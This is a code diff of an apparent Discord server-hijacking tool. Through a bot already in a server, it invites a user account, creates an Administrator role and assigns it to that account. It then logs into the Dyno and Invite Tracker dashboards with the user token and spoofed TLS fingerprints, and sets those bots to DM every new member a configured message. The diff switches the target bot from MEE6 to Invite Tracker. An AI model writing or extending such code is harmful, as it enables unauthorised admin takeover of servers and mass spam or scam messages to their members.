@@ -18,13 +18,13 @@ class Invitation {
 	token = null;
 	userInfo = new Map<string, { id: string; }>();
 
-	public readonly MEE6_ID = '159985870458322944';
-	public readonly MEE6_CLIENT_ID = '159985415099514880';
+	public readonly INVITE_TRACKER_ID = '720351927581278219';
+	public readonly INVITE_TRACKER_CLIENT_ID = '720351927581278219';
 
 	public readonly DYNO_ID = '155149108183695360';
 	public readonly DYNO_CLIENT_ID = '161660517914509312';
 
-	getWelcomeMessage(instance: 'dyno' | 'mee6') {
+	getWelcomeMessage(instance: 'dyno' | 'inviteTracker') {
 		if (!config.welcomerBots[instance]?.updateWelcomer) return false;
 
 		const state = path.join(__dirname, '..', '..', 'state');
@@ -39,8 +39,8 @@ class Invitation {
 	}
 
 	async isAnySpecialActiveBotsInGuild(guild: Guild) {
-		if (this.getWelcomeMessage('mee6')) {
-			if (await guild.members.fetch(this.MEE6_ID).catch(() => null)) {
+		if (this.getWelcomeMessage('inviteTracker')) {
+			if (await guild.members.fetch(this.INVITE_TRACKER_ID).catch(() => null)) {
 				return true;
 			}
 		}
@@ -119,7 +119,7 @@ class Invitation {
 				try {
 					this.logger.info('Accepting invite:', invite);
 					await client.acceptInvite(invite, { bypassOnboarding: false, bypassVerify: false });
-					this.logger.info('Accepted invite:', invite);
+					this.logger.success('Accepted invite:', invite);
 
 					client.destroy();
 
@@ -147,8 +147,8 @@ class Invitation {
 		const botIds = config.bots.map(b => b.botId);
 		const contains = [];
 
-		if (config.welcomerBots.mee6.inviteBot) {
-			botIds.push(this.MEE6_ID);
+		if (config.welcomerBots.inviteTracker.inviteBot) {
+			botIds.push(this.INVITE_TRACKER_ID);
 		}
 
 		if (config.welcomerBots.dyno.inviteBot) {
@@ -185,10 +185,6 @@ class Invitation {
 		}
 
 		try {
-			role = await guild.roles.create({ permissions: ['Administrator'], name: this.client.user.displayName });
-
-			this.logger.success('Created role:', role.id);
-
 			this.logger.info('Creating invite...');
 			if (!guild.members.me) await guild.members.fetchMe();
 			if (!guild.members.me.permissions.has('CreateInstantInvite')) {
@@ -226,6 +222,8 @@ class Invitation {
 						this.logger.warn(`Invites are paused for guild ${guild.id}, skipping it.`);
 						return true;
 					}
+
+					this.logger.error(e);
 
 					const isCaptchaError = e.message.includes('Your captcha was unable to be solved after 3 attempts.');
 
@@ -268,6 +266,10 @@ class Invitation {
 				this.logger.success('Fetched user account:', member.user?.username ?? member.id);
 			}
 
+			role = await guild.roles.create({ permissions: ['Administrator'], name: this.client.user.displayName });
+
+			this.logger.success('Created role:', role.id);
+
 			try {
 				this.logger.info('Adding role to user account...');
 				await member.roles.add(role.id);
@@ -280,8 +282,8 @@ class Invitation {
 
 			const clientIds = config.bots.filter(({ botId }) => !contains.includes(botId)).map(b => b.clientId);
 
-			if (config.welcomerBots.mee6.inviteBot) {
-				clientIds.push(this.MEE6_CLIENT_ID);
+			if (config.welcomerBots.inviteTracker.inviteBot) {
+				clientIds.push(this.INVITE_TRACKER_CLIENT_ID);
 			}
 
 			if (config.welcomerBots.dyno.inviteBot) {
@@ -292,13 +294,13 @@ class Invitation {
 				await this.addBot(client, this.token, guild.id);
 			}
 
-			if (config.welcomerBots.mee6.updateWelcomer) {
+			if (config.welcomerBots.inviteTracker.updateWelcomer) {
 				try {
-					this.logger.info('Updating MEE6 welcome message...');
-					await this.updateMee6WelcomeMessage(guild, this.token);
-					this.logger.success('Updated MEE6 welcome message.');
+					this.logger.info('Updating Invite Tracker welcome message...');
+					await this.updateInviteTrackerWelcomeMessage(guild, this.token);
+					this.logger.success('Updated Invite Tracker welcome message.');
 				} catch (e) {
-					this.logger.error('Failed to update MEE6 welcome message.', e);
+					this.logger.error('Failed to update Invite Tracker welcome message.', e);
 				}
 			}
 
@@ -486,9 +488,13 @@ class Invitation {
 										this.logger.error('Failed to add bot without admin permissions.');
 										return resolve(false);
 									}
+
+									this.logger.error(e);
 								}
 							}
 						}
+
+						this.logger.error(e);
 					}
 				}
 
@@ -500,28 +506,29 @@ class Invitation {
 		return res;
 	}
 
-	async updateMee6WelcomeMessage(guild: Guild, userToken: string, retry: boolean = false) {
-		if (!(await guild.members.fetch(this.MEE6_ID).catch(() => null))) {
-			this.logger.warn('MEE6 not in guild, skipping configuration:', { guild: guild.id, userToken });
+	async updateInviteTrackerWelcomeMessage(guild: Guild, userToken: string, retry: boolean = false) {
+		if (!(await guild.members.fetch(this.INVITE_TRACKER_ID).catch(() => null))) {
+			this.logger.warn('Invite Tracker not in guild, skipping configuration:', { guild: guild.id, userToken });
 			return false;
 		}
 
 		try {
-			const token = await this.getMEE6AuthToken(userToken);
-			if (!token) throw new Error('Failed to get authorization token.');
+			const cookie = await this.getInviteTrackerCookies(userToken);
+			if (!cookie) throw new Error('Failed to get cookie.');
 
-			const setMessage = await this.client.requests(`https://mee6.xyz/api/plugins/welcome/config/${guild.id}`, {
+
+			const setMessage = await this.client.requests(`https://api.invite-tracker.com/v2/modules/${guild.id}/joindm_messages`, {
 				timeout: Infinity,
 				headers: {
-					'Authorization': token,
+					'Cookie': cookie,
 					'User-Agent': config.userAgent,
 					'Content-Type': 'application/json'
 				},
 				body: JSON.stringify({
-					'private_welcome_enabled': true,
-					'private_welcome_message': this.getWelcomeMessage('mee6')
+					'enabled': true,
+					'message': this.getWelcomeMessage('inviteTracker')
 				})
-			}, 'patch');
+			}, 'post');
 
 
 			if (setMessage.status !== 200) {
@@ -530,24 +537,24 @@ class Invitation {
 					const error = json['error']?.['message'];
 
 					if (error?.includes('Unauthorized') && !retry) {
-						this.logger.error('MEE6 welcomer set returned unauthorized. Retrying...', { error });
-						return await this.updateMee6WelcomeMessage(guild, userToken, true);
+						this.logger.error('Invite Tracker set returned unauthorized. Retrying...', { error });
+						return await this.updateInviteTrackerWelcomeMessage(guild, userToken, true);
 					}
 				}
 
-				this.logger.error('MEE6 welcomer set returned unexpected response code:', setMessage.status, '|', 'Expected: 200');
+				this.logger.error('Invite Tracker welcomer set returned unexpected response code:', setMessage.status, '|', 'Expected: 200', setMessage);
 				return false;
 			}
 
 			return true;
 		} catch (e) {
-			this.logger.error('Failed to update MEE6 welcome message:', e);
+			this.logger.error('Failed to update Invite Tracker welcome message:', e);
 			return false;
 		}
 	}
 
-	async getMEE6AuthToken(token: string) {
-		const login = await this.client.requests('https://mee6.xyz/api/login', {
+	async getInviteTrackerCookies(token: string) {
+		const login = await this.client.requests('https://api.invite-tracker.com/v2/auth', {
 			timeout: Infinity,
 			disableRedirect: true,
 			ja3: config.botRequests.ja3,
@@ -559,29 +566,19 @@ class Invitation {
 		if (!login) return false;
 
 
-		if (login.status !== 301 && login.status !== 302) {
-			this.logger.error('MEE6 auth returned unexpected response code from /login:', login.status, '|', 'Expected: 301/302');
+		if (login.status !== 200 && !login.body) {
+			this.logger.error('Invite Tracker auth returned unexpected response code from /login:', login.status, login.body, '|', 'Expected: 200');
 			return false;
 		}
 
-		const cookie = login.headers['Set-Cookie'];
 
-		if (!cookie) {
-			this.logger.error('MEE6 auth didn\'t return:', login.status, '|', 'Expected: 301/302');
-			return false;
-		}
+		const origCookies = login.headers['Set-Cookie'].find((cookie) => cookie.startsWith('session=') && !cookie.startsWith('session=;'));
+		const [origSession] = origCookies.match(/session\=[^;]+/);
 
-		const discord = login.headers['Location'];
-		const [, sessionId] = cookie[0].match(/session\=([^;]+)/);
+		const url = login.body;
+		this.logger.info('Invite Tracker Auth Initial Discord URL:', url);
 
-		this.logger.info('MEE6 Auth Initial Discord URL:', discord);
-
-		const params = discord.split('?')[1];
-		const api = new URL('https://discord.com/api/' + 'v' + config.clientOptions.apiVersion + '/oauth2/authorize?' + params);
-
-		this.logger.info('MEE6 Auth API URL:', api.toString());
-
-		const authorization = await fetch(api, {
+		const authorization = await fetch(url.toString(), {
 			method: 'POST',
 			headers: {
 				'Authorization': token,
@@ -615,178 +612,45 @@ class Invitation {
 		this.logger.success(`Discord auth returned code ${code}.`);
 		this.logger.info('Finalizing login and exchanging code for token...');
 
-		const res = await this.client.requests('https://mee6.xyz/api/finalize-login', {
+		const authorizeURL = new URL('https://api.invite-tracker.com/v2/oauth');
+
+		for (const [key, value] of returnUrl.searchParams.entries()) {
+			authorizeURL.searchParams.set(key, value);
+		}
+
+		this.logger.info('Final auth URL: ', authorizeURL.toString());
+
+		const res = await this.client.requests(authorizeURL.toString(), {
 			ja3: config.botRequests.ja3,
 			timeout: Infinity,
-			cookies: {
-				'session': sessionId
-			},
 			headers: {
-				'User-Agent': config.botRequests.userAgent,
-				'Content-Type': 'application/json'
+				'Cookie': origSession,
+				'User-Agent': config.botRequests.userAgent
 			},
-			body: JSON.stringify({ code, login_type: 'DEFAULT' })
-		}, 'post');
+		}, 'get');
 
-		const json = res.body;
+		if (res.status !== 200 && !res.body) {
+			this.logger.error('Invite Tracker auth returned unexpected response code from API /oauth:', res.status, res.body, '|', 'Expected: 200');
+			return false;
+		}
 
-		if (json['token']) {
-			this.logger.success('Code exchanged for token. Got MEE6 authorization token:', json['token']);
-			return json['token'];
+		const cookies = res.headers['Set-Cookie'].find((cookie) => cookie.startsWith('session=') && !cookie.startsWith('session=;'));
+		const [session] = cookies?.match(/session\=[^;]+/) ?? [];
+
+		if (!session) {
+			this.logger.error(`Failed to get cookie from authorization:`, res.headers);
+			return null;
+		}
+
+		if (res.body['success']) {
+			this.logger.success('Code registered. Got Invite Tracker session:', origSession);
+			return session;
 		} else {
 			return null;
 		}
 	}
 
 	async updateDynoWelcomeMessage(guild: Guild, userToken: string, notInGuildRetries: number = 0, retry: boolean = false) {
-		// if (!await guild.members.fetch(this.DYNO_ID).catch(() => null)) {
-		// 	this.logger.warn('Dyno not in guild, skipping configuration:', { guild: guild.id, userToken });
-		// 	return false;
-		// }
-
-		try {
-			const cookie = await this.getDynoCookies(userToken);
-			if (!cookie) throw new Error('Failed to get cookie.');
-
-			this.logger.info('Enabling Dyno\'s welcomer module...');
-
-			await this.client.requests('https://dyno.gg/manage/' + guild.id + '/modules/welcome', {
-				ja3: config.botRequests.ja3,
-				timeout: Infinity,
-				headers: {
-					'Cookie': cookie,
-					'User-Agent': config.botRequests.userAgent
-				}
-			});
-
-			const enabled = await this.client.requests('https://dyno.gg/api/server/' + guild.id + '/toggleModule', {
-				ja3: config.botRequests.ja3,
-				timeout: Infinity,
-				headers: {
-					'Cookie': cookie,
-					'User-Agent': config.botRequests.userAgent,
-					'Content-Type': 'application/json;charset=UTF-8',
-					'Origin': 'https://dyno.gg',
-					'Referer': `https://dyno.gg/manage/${guild.id}/modules`
-				},
-				body: JSON.stringify({
-					enabled: true,
-					module: 'Welcome'
-				})
-			}, 'post').catch(this.logger.error);
-
-			if (!enabled) return false;
-			if (enabled.status !== 200) {
-				const text = enabled.body;
-
-				if (enabled.status === 403 && text.includes('Unauthorized 1')) {
-					if (!retry) {
-						this.logger.info('Got unauthorized response when enabling welcomer module, retrying.');
-						return this.updateDynoWelcomeMessage(guild, userToken, 0, true);
-					}
-
-					this.logger.error('Failed retry while setting Dyno welcomer enable state.', enabled.status, ', data:', text);
-					return false;
-				}
-
-				if (enabled.status === 401 && text.includes('Unauthorized 2')) {
-					if (notInGuildRetries >= 5) {
-						this.logger.error('Failed 5 retries for not in guild error.', enabled.status, ', data:', text);
-						return false;
-					}
-
-					this.logger.info('Waiting 30 seconds before retrying enabling the welcomer module...');
-					await sleep(30000);
-					this.logger.info('30 second timer over. Retrying.');
-
-					return this.updateDynoWelcomeMessage(guild, userToken, notInGuildRetries++, true);
-				}
-
-				this.logger.error('Got unexpected response code when enabling welcomer module:', enabled.status, '|', 'Expected: 200, data:', text);
-				return false;
-			}
-
-
-			const dm = await this.client.requests('https://dyno.gg/api/server/' + guild.id + '/updateModuleSetting', {
-				ja3: config.botRequests.ja3,
-				timeout: Infinity,
-				headers: {
-					'Cookie': cookie,
-					'User-Agent': config.botRequests.userAgent,
-					'Content-Type': 'application/json'
-				},
-				body: JSON.stringify({
-					module: 'welcome',
-					setting: 'sendDM',
-					value: true
-				})
-			}, 'post').catch(this.logger.error);
-
-			if (!dm) return false;
-			if (dm.status !== 200) {
-				const text = dm.body;
-
-				this.logger.error('Got unexpected response code when setting welcomer module to dm:', dm.status, '|', 'Expected: 200, data:', text);
-				return false;
-			}
-
-			this.logger.success('Set Dyno welcomer sendDM to true.');
-
-			const type = await this.client.requests('https://dyno.gg/api/server/' + guild.id + '/updateModuleSetting', {
-				ja3: config.botRequests.ja3,
-				timeout: Infinity,
-				headers: {
-					'Cookie': cookie,
-					'User-Agent': config.botRequests.userAgent,
-					'Content-Type': 'application/json'
-				},
-				body: JSON.stringify({
-					module: 'welcome',
-					setting: 'type',
-					value: 'MESSAGE'
-				})
-			}, 'post').catch(this.logger.error);
-
-			if (!type) return false;
-			if (type.status !== 200) {
-				const text = type.body;
-
-				this.logger.error('Got unexpected response code when setting type module setting:', type.status, '|', 'Expected: 200, data:', text);
-				return false;
-			}
-
-			this.logger.success('Set Dyno welcomer type to MESSAGE.');
-
-			const msg = await this.client.requests('https://dyno.gg/api/server/' + guild.id + '/updateModuleSetting', {
-				ja3: config.botRequests.ja3,
-				timeout: Infinity,
-				headers: {
-					'Cookie': cookie,
-					'User-Agent': config.botRequests.userAgent,
-					'Content-Type': 'application/json'
-				},
-				body: JSON.stringify({
-					module: 'welcome',
-					setting: 'message',
-					value: this.getWelcomeMessage('dyno')
-				})
-			}, 'post').catch(this.logger.error);
-
-			if (!msg) return false;
-			if (msg.status !== 200) {
-				const text = msg.body;
-
-				this.logger.error('Got unexpected response code when setting the message:', msg.status, '|', 'Expected: 200, data:', text);
-				return false;
-			}
-
-			this.logger.success('Successfully set Dyno welcomer message.');
-
-			return true;
-		} catch (e) {
-			this.logger.error('Failed to update Dyno welcome message:', e);
-			return false;
-		}
 	}
 
 	async getDynoCookies(token: string) {
